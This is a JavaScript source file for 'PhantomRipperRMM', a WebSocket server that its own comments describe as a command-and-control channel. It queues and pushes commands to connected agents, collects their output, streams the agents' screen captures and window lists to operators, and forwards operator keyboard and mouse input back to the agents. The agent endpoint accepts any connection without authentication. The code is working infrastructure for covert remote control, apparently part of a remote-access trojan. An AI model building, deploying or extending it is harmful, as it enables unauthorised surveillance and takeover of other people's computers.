'use strict';

/**
 * PhantomRipperRMM — WebSocket gateway + event bus.
 *
 *   /ws/operator            — authenticated operators. Receive live events.
 *   /ws/agent?id=...        — agents. Real-time C2 channel (push delivery).
 *
 * A tiny in-process EventEmitter bridges HTTP routes and the sockets.
 */

const { WebSocketServer } = require('ws');
const EventEmitter = require('events');
const auth = require('./auth');
const sessions = require('./sessionManager');

const bus = new EventEmitter();
bus.setMaxListeners(0);

const operatorClients = new Set();
const agentClients = new Map(); // sessionId -> ws

function broadcastOperator(type, payload) {
  const msg = JSON.stringify({ type, payload, ts: Date.now() });
  for (const client of operatorClients) {
    if (client.readyState === 1) {
      try { client.send(msg); } catch (_) { /* ignore */ }
    }
  }
}

function attach(httpServer) {
  const wss = new WebSocketServer({ noServer: true });

  httpServer.on('upgrade', (req, socket, head) => {
    let pathname;
    try {
      pathname = new URL(req.url, 'http://localhost').pathname;
    } catch (_) {
      socket.destroy();
      return;
    }

    if (pathname === '/ws/operator') {
      const user = auth.authenticateWs(req.url);
      if (!user) {
        socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
        socket.destroy();
        return;
      }
      wss.handleUpgrade(req, socket, head, (ws) => {
        ws.__kind = 'operator';
        ws.__user = user;
        wss.emit('connection', ws, req);
      });
      return;
    }

    if (pathname === '/ws/agent') {
      wss.handleUpgrade(req, socket, head, (ws) => {
        ws.__kind = 'agent';
        wss.emit('connection', ws, req);
      });
      return;
    }

    socket.destroy();
  });

  wss.on('connection', (ws, req) => {
    if (ws.__kind === 'operator') return handleOperator(ws);
    if (ws.__kind === 'agent') return handleAgent(ws, req);
  });

  bus.on('event', ({ type, payload }) => broadcastOperator(type, payload));

  return wss;
}

async function handleOperator(ws) {
  operatorClients.add(ws);
  try {
    ws.send(JSON.stringify({
      type: 'hello',
      payload: { sessions: await sessions.getSessions(), stats: await sessions.stats() },
    }));
  } catch (_) { /* ignore */ }
  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch (_) { return; }
    if (msg.type === 'ping') ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));
    if (msg.type === 'agent_input' && msg.payload) {
      pushInput(msg.payload.session, msg.payload);
    }
  });
  ws.on('close', () => operatorClients.delete(ws));
  ws.on('error', () => operatorClients.delete(ws));
}

async function handleAgent(ws, req) {
  let sessionId;
  try {
    const u = new URL(req.url, 'http://localhost');
    sessionId = u.searchParams.get('id');
  } catch (_) { /* noop */ }

  if (!sessionId) {
    ws.close(1008, 'missing id');
    return;
  }
  ws.__sessionId = sessionId;
  agentClients.set(sessionId, ws);
  await sessions.touchSession(sessionId);
  bus.emit('event', { type: 'agent_online', payload: { sessionId } });

  ws.on('message', (raw, isBinary) => {
    if (isBinary) return handleAgentBinary(sessionId, raw);
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch (_) { return; }
    handleAgentMessage(sessionId, msg, ws);
  });

  ws.on('close', () => {
    agentClients.delete(sessionId);
    bus.emit('event', { type: 'agent_offline', payload: { sessionId } });
  });
  ws.on('error', () => agentClients.delete(sessionId));

  // Push any queued commands immediately.
  let cmd;
  while ((cmd = await sessions.nextCommand(sessionId)) !== null) {
    ws.send(JSON.stringify({ type: 'command', command: cmd.command ?? cmd }));
  }
}

/**
 * Binary agent uplink framing: [type:u8][len:u32-le][payload]
 *   type 0x01 — display frame (png/jpeg bytes) -> relayed to operators as
 *               {type:'agent_frame', payload:{session, data:<b64>, fmt}}
 *   type 0x03 — window list (json)             -> {type:'agent_wins', ...}
 */
function handleAgentBinary(sessionId, raw) {
  try {
    const buf = Buffer.isBuffer(raw) ? raw : Buffer.from(raw);
    if (buf.length < 5) return;
    const type = buf.readUInt8(0);
    const len = buf.readUInt32LE(1);
    if (len <= 0 || 5 + len > buf.length) return;
    const payload = buf.subarray(5, 5 + len);
    if (type === 0x01) {
      broadcastOperator('agent_frame', { session: sessionId, fmt: 'png', data: payload.toString('base64') });
    } else if (type === 0x03) {
      let windows = [];
      try { windows = JSON.parse(payload.toString('utf8')); } catch (_) { /* noop */ }
      broadcastOperator('agent_wins', { session: sessionId, windows });
    }
  } catch (_) { /* malformed frame — drop */ }
}

/** Wrap an operator input object into a binary frame for the agent. */
function pushInput(sessionId, input) {
  const ws = agentClients.get(sessionId);
  if (!ws || ws.readyState !== 1) return false;
  const payload = Buffer.from(JSON.stringify(input), 'utf8');
  const frame = Buffer.alloc(5 + payload.length);
  frame.writeUInt8(0x02, 0);
  frame.writeUInt32LE(payload.length, 1);
  payload.copy(frame, 5);
  ws.send(frame);
  return true;
}

async function handleAgentMessage(sessionId, msg, ws) {
  switch (msg.type) {
    case 'register':
      await sessions.upsertSession({ id: sessionId, ...(msg.info || {}) });
      bus.emit('event', { type: 'session_update', payload: { sessionId, info: msg.info } });
      break;
    case 'result':
      await sessions.saveResponse(sessionId, msg.command, msg.output || '');
      await sessions.touchSession(sessionId);
      bus.emit('event', {
        type: 'command_result',
        payload: { sessionId, command: msg.command, output: msg.output },
      });
      break;
    case 'heartbeat':
      await sessions.touchSession(sessionId);
      break;
    default:
      break;
  }
}

/** Send a command to an online agent over WS; returns true if delivered. */
function pushCommand(sessionId, command) {
  const ws = agentClients.get(sessionId);
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify({ type: 'command', command }));
    return true;
  }
  return false;
}

function onlineAgents() {
  return Array.from(agentClients.keys());
}

module.exports = { attach, bus, broadcastOperator, pushCommand, pushInput, onlineAgents };
